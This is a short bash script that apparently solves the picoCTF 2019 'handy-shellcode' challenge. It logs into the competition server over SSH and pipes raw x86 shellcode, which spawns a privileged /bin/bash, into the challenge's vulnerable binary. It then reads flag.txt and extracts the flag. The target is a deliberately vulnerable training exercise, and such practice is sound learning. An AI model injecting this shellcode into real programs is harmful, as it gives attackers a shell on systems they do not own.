#!/bin/bash

# Found shellcode here http://shell-storm.org/shellcode/files/shellcode-606.php

ssh -q echubaty@2019shell1.picoctf.com "cd /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6;
(python -c \"print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')\" ; echo -e 'cat flag.txt') | ./vuln" |
grep -oE "picoCTF{.*}" | tee flag.txt
